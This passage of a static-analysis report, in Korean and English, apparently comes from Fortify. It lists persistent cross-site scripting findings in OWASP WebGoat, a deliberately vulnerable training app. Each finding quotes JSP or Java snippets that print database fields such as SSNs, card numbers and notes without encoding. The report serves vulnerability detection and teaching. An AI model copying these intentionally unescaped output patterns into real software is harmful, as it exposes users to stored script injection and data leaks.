                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 8 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>8</LineStart>
<Snippet>	Employee employee = (Employee) session.getAttribute("SQLInjection.Employee");
%&gt;
		&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt;&lt;/div&gt;
		&lt;div class="lesson_text"&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F9EC72FB4BA275DC1ABD88F2CB9DD025" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F923DCADEC840E9C80C09336D9C4FDA6" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UserAdminScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/UserAdminScreen.java</FilePath>
<LineStart>75</LineStart>
<Snippet>		    ResultSet.TYPE_SCROLL_INSENSITIVE,
		    ResultSet.CONCUR_READ_ONLY);
	    ResultSet results = statement.executeQuery(QUERY);

	    if (results != null)</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EEE333C7FFB8C3E77F271E1B002745AC" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0D90EF8331DD24E8C77A06C06CD251B5" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 93 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>93</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="534E027931D59EC4A4462FF83B150B17" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>103</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);

		if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EEB116B8864387547CEAFD74A65C6E6D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6224988C947166BB414AFDD1CA7C84F2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1EBE9095518E1CA8FB10274B9C375E0F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9ECC5AB9E847B1DB3A1933166826C97C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 71 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BAB3016047AD5AA5CE2DDF23BC56082A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 89 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>89</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;			
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="588E91D983E2D1E02DFF70B692231D3D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8E0BEDDA982A5BBF9AB42B04C11D861D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=CrossSiteScripting.DISCIPLINARY_NOTES%&gt;" cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="69196A7A21B35483FE9D3DA03D2AE088" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SqlNumericInjection.java의 makeStationList() 메서드가 265 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>265</LineStart>
<Snippet>	    String key = (String) it.next();
	    select.addElement(new Option(key).addElement((String) stations
		    .get(key)));
	}
	ec.addElement(select);</Snippet>
<TargetFunction>org.apache.ecs.html.Option.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>299</LineStart>
<Snippet>		    ResultSet.TYPE_SCROLL_INSENSITIVE,
		    ResultSet.CONCUR_READ_ONLY);
	    ResultSet results = statement.executeQuery(query);

	    if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6B422DE8916D09194A27C7B849747563" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2B24485020347F2526A94CF9A7CD3B98" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F160952ACCC3F544445B7CB93E098446" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A6B403744D5C43517C62D082A3936371" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 28 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>28</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="858DAFE5368C4858A6DD6C68C4EA0DCA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1E7866EE50D722A5B40E5143E3A5440F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
